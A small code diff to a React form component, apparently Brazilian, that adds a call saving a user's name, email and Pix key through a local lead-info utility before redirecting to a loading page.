@@ -1,6 +1,7 @@
 import atendente from '../../images/atendente.png';
 import { useState } from "react";
 import { redirectWithParams } from "../../utils/redirectWithParams";
+import { saveLeadInfo } from "../../utils/leadInfo";
 import gov1 from '../../images/gov1.png';
 import gov2 from '../../images/gov2.png';
 
@@ -40,6 +41,13 @@ function GetInfos() {
             setPixError("Chave Pix inválida");
             return;
         }
+
+        saveLeadInfo({
+            nome: nome.trim(),
+            email: email.trim().toLowerCase(),
+            pix: pix.trim(),
+            pixType,
+        });
 
         redirectWithParams("/loading");
 
